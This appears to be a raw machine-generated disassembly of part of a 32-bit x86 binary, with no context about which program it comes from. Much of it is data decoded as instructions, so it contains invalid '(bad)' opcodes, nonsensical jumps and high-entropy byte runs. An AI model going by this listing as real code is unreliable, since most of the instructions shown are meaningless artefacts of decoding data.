  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	mov    ebp,es
  413f02:	cdq    
  413f03:	inc    ebx
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	gs jge 0x413f6f
  413f0f:	ja     0x413ec2
  413f11:	sub    BYTE PTR [ecx+0x3e],ch
  413f14:	or     eax,0x747b9f4e
  413f19:	xor    al,0xba
  413f1b:	push   0x43
  413f1d:	sub    al,0x99
  413f1f:	test   eax,0xf10593cd
  413f24:	sbb    cl,ah
  413f26:	repnz push 0x208f999e
  413f2c:	jp     0x413f31
  413f2e:	loopne 0x413eed
  413f30:	pop    ebp
  413f31:	nop
  413f32:	and    DWORD PTR [ebp+0x725cdfcf],ebp
  413f38:	sbb    cl,BYTE PTR [edi]
  413f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f3b:	dec    edi
  413f3c:	outs   dx,BYTE PTR ds:[esi]
  413f3d:	loopne 0x413ef1
  413f3f:	push   cs
  413f40:	xor    al,0xb3
  413f42:	cmp    eax,0x1d34881a
  413f47:	call   FWORD PTR ds:0x5c715585
  413f4d:	int    0x33
  413f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f50:	cdq    
  413f51:	inc    esi
  413f52:	inc    ebx
  413f53:	add    eax,0x73272a5a
  413f58:	pop    edx
  413f59:	sahf   
  413f5a:	and    ch,BYTE PTR [ebp-0x35]
  413f5d:	mov    cs,WORD PTR [ecx-0x66]
  413f60:	add    BYTE PTR [edx+edx*2],dh
  413f63:	cmp    BYTE PTR [ecx+0x68],al
  413f66:	mov    bh,0xd2
  413f68:	add    cl,BYTE PTR [esi+esi*1+0x40d3a2d4]
  413f6f:	mov    ds:0x8543199b,eax
  413f74:	sbb    BYTE PTR [ecx-0x5b],dl
  413f77:	jb     0x413fd0
  413f79:	popa   
  413f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f7b:	xor    dl,cl
  413f7d:	popa   
  413f7e:	(bad)  
  413f80:	xchg   edx,eax
  413f81:	ret    
  413f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f83:	adc    eax,0x4e3d35be
  413f88:	mov    WORD PTR [edi-0x20],cs
  413f8b:	push   eax
  413f8c:	sub    BYTE PTR cs:[ebx-0x23],ah
  413f90:	mov    ds:0xbee492ea,eax
  413f95:	xor    eax,0x9516d302
  413f9a:	mov    esp,0xf72769f1
  413f9f:	movlps QWORD PTR [eax],xmm6
  413fa2:	xor    dh,ah
  413fa4:	dec    eax
  413fa5:	(bad)  
  413fa7:	cmp    BYTE PTR [ebx-0x4fee6ef6],dh
  413fad:	dec    ecx
  413fae:	popa   
  413faf:	data16 cli 
  413fb1:	leave  
  413fb2:	clc    
  413fb3:	pop    esp
  413fb4:	adc    al,0x24
  413fb6:	xchg   ebx,eax
  413fb7:	pop    esp
  413fb8:	mov    ds:0x73476793,al
  413fbd:	out    0x44,al
  413fbf:	pop    ecx
  413fc0:	adc    eax,0x84ded842
  413fc5:	adc    eax,0x2c1b5261
  413fca:	dec    esi
  413fcb:	xchg   BYTE PTR [edx],ch
  413fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fce:	dec    ecx
  413fcf:	mov    edi,0x54028a49
  413fd4:	(bad)  
  413fd5:	mov    cl,0x4a
  413fd7:	pop    ss
  413fd8:	mov    ebp,0x85ea1800
  413fdd:	jns    0x414022
  413fdf:	in     eax,0xc
  413fe1:	add    al,0x59
  413fe3:	je     0x414017
  413fe5:	jno    0x413f9e
  413fe7:	add    eax,0x437331a9
  413fec:	push   edi
  413fed:	imul   edi,DWORD PTR [ecx+0x80ad83b],0xe
  413ff4:	sub    BYTE PTR [ebp-0x707c070a],ah
  413ffa:	sbb    al,0xa5
  413ffc:	lods   eax,DWORD PTR ds:[esi]
  413ffd:	(bad)  
  413ffe:	sbb    al,0xff
  414000:	sbb    dl,bh
  414002:	inc    edx
  414003:	outs   dx,BYTE PTR ds:[esi]
  414004:	xor    DWORD PTR [ecx+0x27],eax
  414007:	push   ds
  414008:	mov    ds:0x650b409,al
  41400d:	imul   edx,eax,0x14
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x6e72:0x74d52e96
  414083:	hlt    
  414084:	loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	dec    ecx
  41408d:	fmulp  st(1),st
  41408f:	mov    bh,0x1e
  414091:	and    DWORD PTR [ebx+0x47f11a7c],0xffffffe6
  414098:	ja     0x41406a
  41409a:	cdq    
  41409b:	dec    edi
  41409c:	jle    0x414071
  41409e:	aaa    
  41409f:	rcr    BYTE PTR [edx-0x56b40160],0x8a
  4140a6:	or     al,0xf0
  4140a8:	mov    ebp,0xf4da0601
  4140ad:	stc    
  4140ae:	leave  
  4140af:	mov    al,0x15
  4140b1:	and    BYTE PTR [ebp+0x41],dl
  4140b4:	sub    dl,BYTE PTR [eax+0x3c]
  4140b7:	cwde   
  4140b8:	fs dec esp
  4140ba:	jns    0x41411d
  4140bc:	push   0x886b4a25
  4140c1:	cdq    
  4140c2:	fsub   DWORD PTR [ecx-0x7c]
  4140c5:	and    BYTE PTR [edx],0x45
  4140c8:	xchg   esp,eax
  4140c9:	(bad)  
  4140ca:	jmp    0x273e3eb6
  4140cf:	dec    edx
  4140d0:	daa    
  4140d1:	into   
  4140d2:	dec    ecx
  4140d3:	xchg   ebx,eax
  4140d4:	loopne 0x41408a
  4140d6:	jl     0x4140cd
  4140d8:	stos   DWORD PTR es:[edi],eax
  4140d9:	mov    ch,0x99
  4140db:	add    ah,dl
  4140dd:	sbb    al,0x69
  4140df:	dec    ecx
  4140e0:	xor    dl,al
  4140e2:	sub    BYTE PTR [ebx+0x67],bl
  4140e5:	cs or  al,0xc4
  4140e8:	repnz inc edx
  4140ea:	and    eax,0x2aec7dd9
  4140ef:	sbb    ch,BYTE PTR ds:0xdc345ab8
  4140f5:	jp     0x41413e
  4140f7:	xor    al,0xd8
  4140f9:	cdq    
  4140fa:	rcl    DWORD PTR [ebx-0x5],cl
  4140fd:	test   al,0xc2
  4140ff:	inc    ebp
  414100:	push   eax
  414101:	in     eax,0xd1
  414103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414104:	cmp    ebx,DWORD PTR [edi+0x4cef3c8]
  41410a:	xchg   ebx,eax
  41410b:	sub    ch,ah
  41410d:	jbe    0x4140e9
  41410f:	cs jbe 0x41412f
  414112:	mov    ds:0x7aee8b42,eax
  414117:	jmp    DWORD PTR [eax]
  414119:	ja     0x4140fd
  41411b:	jecxz  0x414155
  41411d:	pop    ds
  41411e:	bsf    ebp,DWORD PTR [esi-0x79]
  414122:	clc    
  414123:	dec    ebp
  414124:	push   es
  414125:	fwait
  414126:	pop    esp
  414127:	push   0xffffff9b
  414129:	adc    eax,0x43ffd783
  41412e:	xor    edx,DWORD PTR [ebp+0x5fab67e0]
  414134:	pop    ss
  414135:	mov    al,ds:0x2ed838c4
  41413a:	pop    eax
  41413b:	popa   
  41413c:	push   edx
  41413d:	loop   0x414152
  41413f:	das    
  414140:	or     bh,dh
  414142:	js     0x414124
  414144:	dec    esp
  414145:	jno    0x414181
  414147:	or     DWORD PTR [ebx],esi
  414149:	cmc    
  41414a:	mov    ah,0xd7
  41414c:	cmp    edi,DWORD PTR [esi+0x67]
  41414f:	mov    ecx,0x74ce62f9
  414154:	retf   
  414155:	jae    0x414105
  414157:	shl    bl,1
  414159:	and    ah,BYTE PTR [ebp-0x143ad562]
  41415f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414160:	sub    al,0xbc
  414162:	pop    esi
  414163:	call   0x3a29822f
  414168:	add    bl,BYTE PTR [edx-0x487561a9]
  41416e:	cwde   
  41416f:	clc    
  414170:	push   ebx
  414171:	out    dx,eax
  414172:	mov    eax,ds:0x1652d3d3
  414177:	enter  0xb90b,0x5f
  41417b:	ret    
  41417c:	retf   
  41417d:	mov    ds,esp
  41417f:	shl    DWORD PTR [ecx],cl
  414181:	in     al,dx
  414182:	aam    0x97
  414184:	call   0x73aefcc6
  414189:	pop    edi
  41418a:	mov    bl,0xfe
  41418c:	jb     0x414167
  41418e:	add    al,0x4f
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	pop    es
  414201:	jne    0x4141cd
  414203:	repz in al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	nop
  41420d:	dec    esp
  41420e:	daa    
  41420f:	out    0xbc,al
  414211:	adc    ah,al
  414213:	cmp    DWORD PTR [edx+0x77c87aef],0xffffffa2
  41421a:	sbb    edi,DWORD PTR [eax+0x376feecc]
  414220:	retf   
  414221:	inc    edx
  414222:	jne    0x4141e9
  414224:	and    eax,0x8df28822
  414229:	es jmp 0xdd29dc6c
  41422f:	mov    edi,0x4643d134
  414234:	out    0xbe,al
  414236:	mov    fs,WORD PTR [ecx]
  414238:	inc    ebp
  414239:	mov    ebp,0x58a145f1
  41423e:	jo     0x41422a
  414240:	mov    ds:0xd2c79e53,eax
  414245:	adc    cl,bl
  414247:	(bad)  
  414248:	in     al,0xd5
  41424a:	inc    esp
  41424b:	mov    al,0x75
  41424d:	xor    al,0x4e
  41424f:	mov    dh,0xcc
  414251:	bound  edx,QWORD PTR [ecx-0x2e]
  414254:	xor    esi,ebp
  414256:	xchg   ebx,eax
  414257:	pop    es
  414258:	sbb    eax,0x2ca8aa1e
  41425d:	push   edx
  41425e:	shl    ecx,cl
  414260:	in     eax,dx
  414261:	mov    BYTE PTR [esi],dh
  414263:	(bad)  
  414264:	cdq    
  414265:	xor    ch,dh
  414267:	div    BYTE PTR [ebx+ecx*1]
  41426a:	xchg   ebx,eax
  41426b:	jb     0x4142a9
  41426d:	shr    BYTE PTR [ebx*1+0x7d3a3143],0x14
  414275:	jmp    0x4141fe
  414277:	leave  
  414278:	lea    eax,[edi+0x2]
  41427b:	or     ah,BYTE PTR [eax-0x740cfa39]
  414281:	add    al,0x61
  414283:	rcr    DWORD PTR [edx-0x9],cl
  414286:	test   eax,0x6d6c42c
  41428b:	das    
  41428c:	or     al,0x44
  41428e:	shl    DWORD PTR [ecx-0x5b37fa7a],0x27
  414295:	sbb    BYTE PTR [esi],dh
  414297:	cs add al,0x1
  41429a:	jmp    DWORD PTR [ebx+0x4ea7896b]
  4142a0:	dec    ebp
  4142a1:	repz adc edi,DWORD PTR [eax+ebp*1+0x59a1dbff]
  4142a9:	repz mov ebp,0x3b61910
  4142af:	add    eax,DWORD PTR [ecx+0x46a18c46]
  4142b5:	ffreep st(3)
  4142b7:	lock (bad) 
  4142b9:	dec    ebp
  4142ba:	jb     0x414271
  4142bc:	jecxz  0x41425d
  4142be:	mov    ds:0xf0783285,eax
  4142c3:	pushf  
  4142c4:	stos   BYTE PTR es:[edi],al
  4142c5:	add    BYTE PTR [edx],cl
  4142c7:	cld    
  4142c8:	iret   
  4142c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ca:	lds    ebp,FWORD PTR [edi-0xe]
  4142cd:	push   0x6a
  4142cf:	lds    esi,FWORD PTR [ecx+0x4e]
  4142d2:	cmp    eax,0xad12d19
  4142d7:	loopne 0x414295
  4142d9:	sar    BYTE PTR [edi],0xfb
  4142dc:	lock and ah,dh
  4142df:	push   0xacc2e205
  4142e4:	das    
  4142e5:	out    dx,al
  4142e6:	push   0xdffa9715
  4142eb:	pop    edx
  4142ec:	xchg   ebx,eax
  4142ed:	popf   
  4142ee:	dec    edi
  4142ef:	push   ebx
  4142f0:	adc    eax,0xaf454428
  4142f5:	xchg   edx,eax
  4142f6:	mov    bh,0x5c
  4142f8:	and    eax,0xc14829fc
  4142fd:	add    al,0x37
  4142ff:	dec    eax
  414300:	out    dx,al
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	jnp    0x414346
  414304:	sti    
  414305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414306:	xchg   esp,eax
  414307:	es lock jno 0x4142bc
  41430b:	or     eax,ebx
  41430d:	loope  0x4142ea
  41430f:	stc    
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	sub    eax,DWORD PTR [edx-0x2b17ff76]
  414386:	add    BYTE PTR [eax],al
  414388:	add    al,0x1
  41438a:	add    BYTE PTR [eax],al
  41438c:	jl     0x4143d9
  41438e:	sub    esp,DWORD PTR [ecx]
  414390:	pusha  
  414391:	inc    ebx
  414392:	xor    eax,0x1ec48182
  414397:	fwait
  414398:	popf   
  414399:	xchg   ecx,eax
  41439a:	cmc    
  41439b:	dec    ebx
  41439c:	add    al,cl
  41439e:	cmp    eax,0xdf4ebf63
  4143a3:	das    
  4143a4:	clc    
  4143a5:	mov    ah,0x7b
  4143a7:	jnp    0x41439a
  4143a9:	inc    eax
  4143aa:	cmp    al,BYTE PTR [ebp+0x33]
  4143ad:	repz dec esp
  4143af:	mov    eax,ds:0xd31d8cd5
  4143b4:	shl    DWORD PTR [ebp+0x52],0x58
  4143b8:	xchg   BYTE PTR [ecx-0x129c336f],bh
  4143be:	mov    ds:0xea7587b9,al
  4143c3:	dec    eax
  4143c4:	mov    eax,ds:0xb566d1c3
  4143c9:	and    cl,dh
  4143cb:	loope  0x4143d0
  4143cd:	nop
  4143ce:	ret    
  4143cf:	push   ebp
  4143d0:	in     al,0xac
  4143d2:	dec    edi
  4143d3:	xchg   bl,ah
  4143d5:	push   edx
  4143d6:	mov    ds:0xdefe081b,al
  4143db:	jae    0x414456
  4143dd:	xchg   ecx,eax
  4143de:	das    
  4143df:	popa   
  4143e0:	push   esp
  4143e1:	jnp    0x414386
  4143e3:	test   eax,0x47ff1df0
  4143e8:	cli    
  4143e9:	mov    al,ds:0x86df4dba
  4143ee:	push   ecx
  4143ef:	sti    
  4143f0:	push   ebx
  4143f1:	(bad)  
  4143f2:	xchg   ecx,eax
  4143f3:	daa    
  4143f4:	mov    ds:0x323ad0a7,al
  4143f9:	shl    DWORD PTR ds:0xebd6bc4c,0xcb
  414400:	mov    al,0xd0
  414402:	mov    ebx,DWORD PTR [edx+0x2d]
  414405:	ja     0x414418
  414407:	call   0xd4dda626
  41440c:	ja     0x4143b4
  41440e:	loop   0x4143c5
  414410:	xor    bl,bl
  414412:	dec    esi
  414413:	dec    ebp
  414414:	dec    edx
  414415:	mov    cs,WORD PTR [ebp+0x69]
  414418:	xchg   esp,eax
  414419:	pop    es
  41441a:	push   ss
  41441b:	nop
  41441c:	aam    0x5f
  41441e:	sub    BYTE PTR [eax-0x3933f6f0],al
  414424:	sti    
  414425:	icebp  
